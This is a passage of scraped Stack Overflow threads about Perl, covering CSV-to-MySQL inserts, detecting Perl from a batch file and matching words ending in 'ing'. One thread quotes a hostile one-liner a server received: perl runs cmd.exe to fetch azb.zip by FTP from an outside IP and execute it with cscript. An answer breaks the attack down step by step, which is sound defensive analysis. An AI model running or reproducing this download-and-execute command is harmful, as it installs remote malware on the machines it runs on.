"user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "is_accepted": false, "score": 0, "last_activity_date": 1473187014, "creation_date": 1473187014, "answer_id": 39355728, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas/39355728#39355728", "title": "Mysql insert into with values containing double commas", "body": "<p>I solved this with another approach: first enclosed each field in inverted quotes, even the empty ones. The data looked like this after enclosing in quotes:</p>\n\n<pre><code>'fname1','lname1','123','34543','f1@gmail.com'\n'fname2','lname2','344','45645','f2@gmail.com'\n'fname3','lname3','454','','f3@gmail.com'\n</code></pre>\n\n<p>This was done with the programming language. After this step, there was no problem inserting the data.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user6802918"}, "is_accepted": false, "score": 1, "last_activity_date": 1473222032, "creation_date": 1473222032, "answer_id": 39361136, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas/39361136#39361136", "title": "Mysql insert into with values containing double commas", "body": "<p>The computer does not understand what you are trying to insert because it cannot understand that there is empty value in between the two commas. If your are doing this from <code>perl</code>, then try to enclose each value within <code>quotes</code>, even the empty ones. For an example in your data line 3 change</p>\n\n<pre><code>fname3,lname3,454,,f3@gmail.com\n</code></pre>\n\n<p>to</p>\n\n<pre><code>'fname3','lname3','454','','f3@gmail.com'\n</code></pre>\n\n<p>This is easy to achieve in any programming language. Now try to insert. It will not throw exception as the part between them will be empty string.</p>\n"}, {"tags": [], "owner": {"reputation": 1635, "user_id": 1833295, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/92b2f1eef56fd94b7cf5a217d8b03bc3?s=128&d=identicon&r=PG", "display_name": "Amrit Shrestha", "link": "https://stackoverflow.com/users/1833295/amrit-shrestha"}, "is_accepted": false, "score": 1, "last_activity_date": 1473417753, "creation_date": 1473417753, "answer_id": 39409743, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas/39409743#39409743", "title": "Mysql insert into with values containing double commas", "body": "<p>enclose every value by inverted comma like 'fname3','lname3','454','','f3@gmail.com'. Note here the empty inverted commas in between commas. This will do the trick</p>\n"}], "owner": {"reputation": 4937, "user_id": 2445025, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/HTAcm.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2445025/prabhu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 470, "favorite_count": 0, "answer_count": 5, "score": 0, "last_activity_date": 1473417753, "creation_date": 1466361609, "question_id": 37910583, "link": "https://stackoverflow.com/questions/37910583/mysql-insert-into-with-values-containing-double-commas", "title": "Mysql insert into with values containing double commas", "body": "<p>I am trying to insert values into a <code>MySQL</code> table line by line, that is read from a <code>CSV</code> file in <code>Perl</code>. If any field is empty in CSV file, there will be two consecutive commas. E.g.</p>\n\n<pre><code>Firstname,Lastname,Code,Phone,Email\nfname1,lname1,123,34543,f1@gmail.com\nfname2,lname2,344,45645,f2@gmail.com\nfname3,lname3,454,,f3@gmail.com\n</code></pre>\n\n<p>In the third row, there is no phone no. So there is two consecutive commas. When we try to insert into mysql with following command, it fails.</p>\n\n<pre><code>insert into table1 (Firstname,Lastname,Code,Phone,Email) values (fname3,lname3,454,,f3@gmail.com)\n</code></pre>\n\n<p>How to do that?</p>\n\n<p>I have used following code to do that.</p>\n\n<pre><code>open CSV, $file or die $!;\nmy @csv_content = &lt;CSV&gt;;\nclose CSV;\nmy $fields = \"Firstname,Lastname,Code,Phone,Email\";\nmy $table = \"table1\";\n\nmy $csv = Text::CSV-&gt;new();\nforeach(@csv_content){\n   if($csv-&gt;parse($_)){\n         my @values = $csv-&gt;fields();\n         my $status = $csv-&gt;combine(@values);\n         my $line = $csv-&gt;string();\n\n         $statement = \"INSERT INTO $table($fields) VALUES($line);\";\n         $sth = $dbh-&gt;prepare( $statement );\n         $sth-&gt;execute() or die \"$! $DBI::errstr\";\n    }\n}\n</code></pre>\n"}, {"tags": ["perl", "batch-file", "cmd"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1466346495, "post_id": 37907271, "comment_id": 63268541, "body": "<a href=\"http://stackoverflow.com/questions/4781772/how-to-test-if-an-executable-exists-in-the-path-from-a-windows-batch-file\" title=\"how to test if an executable exists in the path from a windows batch file\">stackoverflow.com/questions/4781772/&hellip;</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1466349395, "post_id": 37907271, "comment_id": 63269421, "body": "<i>&quot;If not installed, install it silently&quot;</i> I wouldn&#39;t be so sure about doing that, especially without a <code>Do you want to install Perl?</code> prompt. There are several situations where an installation may not be appropriate, and it may even be that there is already a copy installed, or present on the PATH with a different file name like <code>perl.5.24.0.exe</code>. You should leave the user in control of their own PC."}, {"owner": {"reputation": 10781, "user_id": 447901, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/11ea5dd4ad290e75422e32e1e340772e?s=128&d=identicon&r=PG", "display_name": "lit", "link": "https://stackoverflow.com/users/447901/lit"}, "edited": false, "score": 0, "creation_date": 1466445846, "post_id": 37907271, "comment_id": 63308660, "body": "Installing programs without the user&#39;s consent is not good citizenship. Viruses do that. Don&#39;t be a virus."}], "answers": [{"comments": [{"owner": {"reputation": 59189, "user_id": 778560, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/52ebdc4690fff7b07d3644c4cb7b255a?s=128&d=identicon&r=PG", "display_name": "Aacini", "link": "https://stackoverflow.com/users/778560/aacini"}, "edited": false, "score": 2, "creation_date": 1466346158, "post_id": 37907402, "comment_id": 63268444, "body": "This works because <i>&quot;If a non-existent command is entered for execution, set ERRORLEVEL = 9009&quot;</i>. Further details <a href=\"http://stackoverflow.com/questions/34987885/what-are-the-errorlevel-values-set-by-internal-cmd-exe-commands/34987886#34987886\">here</a>"}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 3, "last_activity_date": 1466344262, "last_edit_date": 1495540727, "creation_date": 1466340535, "answer_id": 37907402, "question_id": 37907271, "link": "https://stackoverflow.com/questions/37907271/how-to-check-if-perl-is-windows-command/37907402#37907402", "title": "How to check if perl is Windows command?", "body": "<p>Perhaps <a href=\"https://stackoverflow.com/q/334879/5830574\">How do I get the application exit code from a Windows command line?</a> and <a href=\"https://stackoverflow.com/q/1420965/5830574\">Redirect Windows cmd stdout and stderr to a single file</a> might help you.</p>\n\n<p>Run </p>\n\n<pre><code>perl -e1 2&gt;NUL\nif errorlevel 1 (\n    echo Perl is not installed\n)\n</code></pre>\n\n<p><code>perl -e1</code> simply executes the Perl expression <code>1</code> as a one-liner which always is successful if Perl is installed. It produces no ouput at all, except it complains when Perl isn't found. That's why I redirected STDERR to NUL so you will not see any output, even not the error messages.</p>\n\n<p>The <code>if errorlevel 1</code> checks whether the returncode of the last command (<code>perl -e1</code> in this case) was <code>&gt;=1</code>. If Perl is installed and was executable then its returncode will be <code>0</code> (meaning success) and the <code>if</code> won't trigger.</p>\n\n<p>You could also use <code>perl -v</code> but <em>that</em> produces output on STDOUT. In that case you would have to redirect both STDOUT and STDERR to NUL, like so: <code>perl -v &gt;NUL 2&gt;&amp;1</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 6030421, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jlfdl.png?s=128&g=1", "display_name": "NanoPi", "link": "https://stackoverflow.com/users/6030421/nanopi"}, "is_accepted": false, "score": 0, "last_activity_date": 1466600673, "creation_date": 1466600673, "answer_id": 37968923, "question_id": 37907271, "link": "https://stackoverflow.com/questions/37907271/how-to-check-if-perl-is-windows-command/37968923#37968923", "title": "How to check if perl is Windows command?", "body": "<pre><code>&gt;nul 2&gt;nul where perl || echo not installed\n</code></pre>\n\n<p>this checks for perl without trying to run perl.</p>\n\n<p>where prints to STDOUT if it finds the file/command in folders listed in %PATH% or prints to STDERR if it doesn't.</p>\n"}], "owner": {"reputation": 41, "user_id": 4433137, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/0a8e727948307ec59894f3860a2f1fb2?s=128&d=identicon&r=PG&f=1", "display_name": "ermai", "link": "https://stackoverflow.com/users/4433137/ermai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4675, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1517622822, "creation_date": 1466339645, "last_edit_date": 1517622822, "question_id": 37907271, "link": "https://stackoverflow.com/questions/37907271/how-to-check-if-perl-is-windows-command", "title": "How to check if perl is Windows command?", "body": "<p>I would like to write a batch file to silently install Perl MSI. However, the server/PC may have Perl installed, the batch file's flow would be:</p>\n\n<ol>\n<li>Check if Perl is installed.</li>\n<li>If not installed, install it silently.</li>\n</ol>\n\n<p>I know that the command <code>perl-v</code> reports Perl version if Perl is installed, but do not have idea how to check whether the <code>perl</code> command is executable on the server/PC by windows batch file.</p>\n"}, {"tags": ["android", "perl", "cmd", "server"], "comments": [{"owner": {"reputation": 36287, "user_id": 2649012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/i4SzF.jpg?s=128&g=1", "display_name": "Phant&#244;maxx", "link": "https://stackoverflow.com/users/2649012/phant%c3%b4maxx"}, "edited": false, "score": 6, "creation_date": 1466337431, "post_id": 37906228, "comment_id": 63266079, "body": "I&#39;m voting to close this question as off-topic because it&#39;s <b>not a programming issue</b>"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 36287, "user_id": 2649012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/i4SzF.jpg?s=128&g=1", "display_name": "Phant&#244;maxx", "link": "https://stackoverflow.com/users/2649012/phant%c3%b4maxx"}, "edited": false, "score": 4, "creation_date": 1466337721, "post_id": 37906228, "comment_id": 63266154, "body": "It&#39;s a nice question, but @Bob is right. What would be appropriate? <a href=\"https://superuser.com\">Super User</a>, <a href=\"https://serverfault.com\">Server Fault</a>, <a href=\"https://webmasters.stackexchange.com\">Webmasters</a>? Can we move it?"}, {"owner": {"reputation": 90, "user_id": 6022818, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4192242afdb97e23e12e5a83670767c?s=128&d=identicon&r=PG&f=1", "display_name": "Andr&#233;s Fg", "link": "https://stackoverflow.com/users/6022818/andr%c3%a9s-fg"}, "edited": false, "score": 0, "creation_date": 1466339036, "post_id": 37906228, "comment_id": 63266488, "body": "Bob maybe this problem could happen to other programmers in the future. The answer of pearl is very useful for any people with this problem. I am sure that I am not the unique"}, {"owner": {"reputation": 36287, "user_id": 2649012, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/i4SzF.jpg?s=128&g=1", "display_name": "Phant&#244;maxx", "link": "https://stackoverflow.com/users/2649012/phant%c3%b4maxx"}, "edited": false, "score": 3, "creation_date": 1466339443, "post_id": 37906228, "comment_id": 63266599, "body": "It&#39;s not  a bad question. But it simply <b>doesn&#39;t belong to here</b>."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1466346291, "post_id": 37906228, "comment_id": 63268490, "body": "Not sure how I feel about this particular question (the code is pretty short, after all), but see <a href=\"http://meta.stackoverflow.com/questions/321709/how-to-handle-what-does-this-malicious-obfuscated-code-do-questions\">How to handle &quot;What does this (malicious) obfuscated code do?&quot; questions</a> on Meta."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466350075, "post_id": 37906228, "comment_id": 63269607, "body": "@Andr&#233;sFg: There are many questions, such as <i>what can I do if I run out of petrol in the middle of the Nevada desert</i>, that may apply to other programmers. But that doesn&#39;t belong here either. Stack Overflow is about <i>specfic problems</i> with getting a program to work. I think it belongs on <i>Super User</i>. That site is for questions <i>&quot;about computer software, and not about programming and software development&quot;</i>, amongst other things"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1466350528, "post_id": 37906228, "comment_id": 63269737, "body": "@PerlDog: You need 3,000+ reputation, and you just vote to close the question, giving the reason that it &quot;belongs on another site&quot;."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1466350592, "post_id": 37906228, "comment_id": 63269767, "body": "@PerlDog: <a href=\"http://meta.stackexchange.com/questions/10249/what-is-migration-and-how-does-it-work\"><i>What is migration and how does it work?</i></a> explains it well"}], "answers": [{"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 12, "last_activity_date": 1466344410, "last_edit_date": 1466344410, "creation_date": 1466334446, "answer_id": 37906550, "question_id": 37906228, "link": "https://stackoverflow.com/questions/37906228/i-received-in-my-server-a-message-that-could-be-from-a-hacker/37906550#37906550", "title": "I received in my server a message that could be from a hacker", "body": "<p>Indeed this seems like an attack (or an attempt). If I split the line up, I end with the following:</p>\n\n<p>The \"individual\" tries to execute some code on your server. It first creates a file called <code>f</code> with the following content:</p>\n\n<pre><code>bin\nget azb.zip %temp%\\z.zip\nbye\n</code></pre>\n\n<p>Then it runs the <code>ftp</code> command with that file as input, i.e. it connects to 112.213.127.52 and fetches the file <code>azb.zip</code> and stores it locally (on your server) as <code>%temp%\\z.zip</code></p>\n\n<p>Finally it runs</p>\n\n<pre><code>cscript.exe /b /e:VBScript.Encode %temp%\\z.zip 579562847 macu://58.238.143.25:88/h\n</code></pre>\n\n<p>The whole snippet is wrapped into a <code>perl</code> one-liner. Perl's <code>system()</code> function simply executes the external command given to it, in this case the <code>cmd.exe</code>. I think it's done because it is very unlikely that your server will run <code>cmd.exe</code> but it <em>may</em> run <code>perl</code> because <code>perl</code> is frequently used for server scripts (e.g. cgi scripts).</p>\n\n<p>Good news is: This will work only if all of the following conditions are met:</p>\n\n<ul>\n<li>Your server must have <code>perl.exe</code> installed</li>\n<li>it must have <code>cmd.exe</code> installed</li>\n<li>it must have <code>cscript.exe</code> installed</li>\n<li>it must interpret <code>%temp%</code> correctly</li>\n<li>most important: your server and your server-side application must be configured to execute arbitrary code that was given via a GET request, which isn't very likely.</li>\n</ul>\n\n<p><a href=\"https://www.iplocation.net/\">This site</a> says the address 58.238.143.25 is from South Korea and 112.213.127.52 is from Hong Kong.</p>\n\n<p>I wouldn't care. This is an attack for Windows based servers. Is yours?</p>\n"}], "owner": {"reputation": 90, "user_id": 6022818, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e4192242afdb97e23e12e5a83670767c?s=128&d=identicon&r=PG&f=1", "display_name": "Andr&#233;s Fg", "link": "https://stackoverflow.com/users/6022818/andr%c3%a9s-fg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 229, "favorite_count": 3, "closed_date": 1466367072, "answer_count": 1, "score": 4, "last_activity_date": 1466349771, "creation_date": 1466331986, "last_edit_date": 1466349771, "question_id": 37906228, "link": "https://stackoverflow.com/questions/37906228/i-received-in-my-server-a-message-that-could-be-from-a-hacker", "closed_reason": "Not suitable for this site", "title": "I received in my server a message that could be from a hacker", "body": "<p>I have a Chess App Online made in Android.</p>\n\n<p>I monitor all messages the server receives after the client has called <code>.accept()</code> and I read the <code>BufferedReader()</code>.</p>\n\n<p>I recently got a very strange message from an unknown user, which doesn't match at all with the usual message format that I get.</p>\n\n<p>This was what the server received:</p>\n\n<pre><code>?2                  28 \\perl.exe  -esystem('cmd.exe /c echo bin&gt;f&amp;echo get azb.zip %temp%\\\\z.zip&gt;&gt;f&amp;echo bye&gt;&gt;f&amp;ftp -A -s:f 112.213.127.52 &amp;cscript.exe /b /e:VBScript.Encode %temp%\\\\z.zip 579562847 macu://58.238.143.25:88/h')\n</code></pre>\n\n<p>Does anyone have any idea of what is this? And if is dangerous, what can I do?</p>\n"}, {"tags": ["regex", "perl", "pattern-matching"], "comments": [{"owner": {"reputation": 37822, "user_id": 1231450, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/b9c98b4ce12bf9fd925d8c35c8861bb2?s=128&d=identicon&r=PG", "display_name": "Jan", "link": "https://stackoverflow.com/users/1231450/jan"}, "edited": false, "score": 0, "creation_date": 1466331474, "post_id": 37905961, "comment_id": 63264579, "body": "Straight forward: <a href=\"https://regex101.com/r/nN4wH9/1\" rel=\"nofollow noreferrer\"><b><code>\\w+ing\\b</code></b></a> - replace those with <code>$0 CC</code> and you&#39;re done. <code>\\w+</code> makes sure letters are preceding, <code>\\b</code> is a word boundary."}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 0, "creation_date": 1466351077, "post_id": 37905961, "comment_id": 63269913, "body": "Uncomment <code>use strict</code> and <code>use warnings</code>. You&#39;ll see that you miss-typed <code>word_match</code> line 23 (you added an &#39;s&#39;), and you used twice <code>$w_fh</code> instead of <code>$word_fh</code>.. (that&#39;s not the solution to your question though, but you still should do that)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466352034, "post_id": 37905961, "comment_id": 63270225, "body": "The code you show doesn&#39;t produce the output that you say it does. If you want us to help you then please show your real code, and especially <b><i>never comment out <code>use strict</code> and <code>use warnings</code></i></b>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466352556, "post_id": 37906075, "comment_id": 63270395, "body": "We don&#39;t know that the platform isn&#39;t Windows. <code>perl cccing.pl ... </code> is always safer"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 2, "last_activity_date": 1466330892, "creation_date": 1466330892, "answer_id": 37906075, "question_id": 37905961, "link": "https://stackoverflow.com/questions/37905961/search-for-words-ending-with-ing-from-a-text-file-in-perl/37906075#37906075", "title": "Search for words ending with &#39;ing&#39; from a text file in perl", "body": "<p>It's not clear to me what your code is doing. What, for example, is the point of the <code>%word_match</code> hash? And why have you commented out <code>use strict</code> and <code>use warnings</code>?</p>\n\n<p>It seems likely that you are over-thinking the problem as this seems pretty simple to me.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nwhile (&lt;&gt;) {\n  chomp;\n  $_ .= ' CCC' if /ing$/;\n  print \"$\\n\";\n}\n</code></pre>\n\n<p>This is written as a Unix-style filter. It reads from STDIN and writes to STDOUT. So, (assuming it was in a file called <code>cccing</code>) you would call it like this:</p>\n\n<pre><code>$ ./cccing &lt; your_input.txt &gt; your_output.txt\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "edited": false, "score": 0, "creation_date": 1466345924, "post_id": 37907584, "comment_id": 63268382, "body": "The program executes ,however prints &#39;CC&#39; beside the word &quot;running&quot; only. &#39;cats and dogs are running CC around  john loves mary  I am swimming  &#39; It doesn&#39;t print CC beside swimming.."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "edited": false, "score": 0, "creation_date": 1466346143, "post_id": 37907584, "comment_id": 63268443, "body": "<code>swimming</code> contains a trailing blank. It actually is <code>&#39;swimming &#39;</code>. I updated my answer but you could have figured out that yourself."}, {"owner": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "edited": false, "score": 0, "creation_date": 1466351113, "post_id": 37907584, "comment_id": 63269924, "body": "Im not sure if I should post a new question or ask it here itself. Is it possible to include more than one condition in the &#39;if&#39;section or I should be using &#39;elsif&#39;. For eg, In addition to getting words ending with &#39;ing&#39; if I also want to look for words ending with &#39;s&#39; in the same text file and print &#39;CC&#39; beside them, should I be using an &#39;elsif&#39; command or I can pass multiple parameters under &#39;if&#39;? Also, if I want to look for words ending with &#39;d&#39; and print &#39;DD&#39; beside them in the same program, should &#39;elsif&#39; be the best way? Thanks in Advance."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "edited": false, "score": 1, "creation_date": 1466352405, "post_id": 37907584, "comment_id": 63270346, "body": "@Nandini143: You can write <code>if ( &#47;ing\\s*$&#47; or &#47;s\\s*$&#47; ) { ... }</code>. Or you can combine that into a single regex with <code>if ( &#47;(?:ing|s)\\s*$&#47; ) { ... }</code>"}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 0, "last_activity_date": 1466352534, "last_edit_date": 1495535341, "creation_date": 1466341731, "answer_id": 37907584, "question_id": 37905961, "link": "https://stackoverflow.com/questions/37905961/search-for-words-ending-with-ing-from-a-text-file-in-perl/37907584#37907584", "title": "Search for words ending with &#39;ing&#39; from a text file in perl", "body": "<p>That's because you are reading your file1.txt twice and check whether they match. In the <code>while</code> loop you print 'CC' if the current line of file1.txt is also contained somewhere in file1.txt. Since they are the same files this is always true and 'CC' is printed after every line.</p>\n\n<p>You might have been inspired by <a href=\"https://stackoverflow.com/q/37899315/5830574\">this question</a> where the OP wanted to check whether words in file A are also contained in file B. Yours is a different case because you don't have two files.</p>\n\n<p>Drop the first reading of file1.txt into <code>%word_match</code> and iterate over the file just once. Your line <code>$word =~ /ing$/;</code> only checks whether <code>$word</code> ends in <code>ing</code> but throws the result away. That is like writing</p>\n\n<pre><code>$i &gt; 5;\nprint \"i is greater than 5\\n\";\n</code></pre>\n\n<p>You have to change that to</p>\n\n<pre><code>if ( $i &gt; 5 ) {\n    print \"i is greater than 5\\n\";\n}\n</code></pre>\n\n<p>In summary this gives</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nopen my $fh, '&lt;', 'file1.txt' or die $!;\nwhile ( &lt;$fh&gt; ){\n    chomp;\n    print $_;\n    if ( /ing\\s*$/ ) {\n        print ' CC';\n    }\n    print \"\\n\";\n}\nclose($fh);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1466356694, "creation_date": 1466356694, "answer_id": 37909831, "question_id": 37905961, "link": "https://stackoverflow.com/questions/37905961/search-for-words-ending-with-ing-from-a-text-file-in-perl/37909831#37909831", "title": "Search for words ending with &#39;ing&#39; from a text file in perl", "body": "<p>As others have commented, you are using your hash <code>%word_match</code> to test whether each word in the file exists in the same file. Of course that is true for every word, so you get a <code>CC</code> appended to everything</p>\n\n<p>Removing the first <code>open</code>, the loop that builds the hash, and the test on the hash, I think this is the best way. It will handle multiple words per line as your own code does, and also avoids the need to allow for whitespace in the regex pattern</p>\n\n<h3>Perl code</h3>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $file = 'file1.txt';\n\nopen my $fh, '&lt;', $file or die $!;\n\nwhile ( &lt;$fh&gt; ){\n    chomp;\n\n    my @words_in_line = split;\n\n    for my $word ( @words_in_line ) {\n\n        $word .= ' CC' if $word =~ /(?:ing|s)$/;\n    }\n\n    print \"    @words_in_line\\n\";\n}\n</code></pre>\n\n<h3>input</h3>\n\n<pre><code>cats\nand\ndogs\nare running around\n|\n\njohn loves mary\n|\n\nI\nam\nswimming \n|\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>cats CC\nand\ndogs CC\nare running CC around\n|\n\njohn loves CC mary\n|\n\nI\nam\nswimming CC\n|\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 4090045, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/221389e356f56892a00164f051b81590?s=128&d=identicon&r=PG&f=1", "display_name": "Nandini143", "link": "https://stackoverflow.com/users/4090045/nandini143"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 335, "favorite_count": 0, "accepted_answer_id": 37907584, "answer_count": 3, "score": 0, "last_activity_date": 1466356694, "creation_date": 1466330181, "last_edit_date": 1466353699, "question_id": 37905961, "link": "https://stackoverflow.com/questions/37905961/search-for-words-ending-with-ing-from-a-text-file-in-perl", "title": "Search for words ending with &#39;ing&#39; from a text file in perl", "body": "<p>I have a text file , lets call it file1.txt :</p>\n\n<pre><code>cats\nand\ndogs\nare\nrunning\naround\n|\n\njohn\nloves\nmary\n|\n\nI\nam\nswimming \n|\n</code></pre>\n\n<p>I am trying to build a program which looks for the words ending with 'ing' and prints CC beside them on the same file or to a different output.txt file.</p>\n\n<p>Desired Output</p>\n\n<pre><code>cats\nand\ndogs\nare\nrunning  CC\naround\n|\n\njohn\nloves\nmary\n|\n\nI\nam\nswimming CC\n|\n</code></pre>\n\n<p>I went through the available articles in the forum and tried 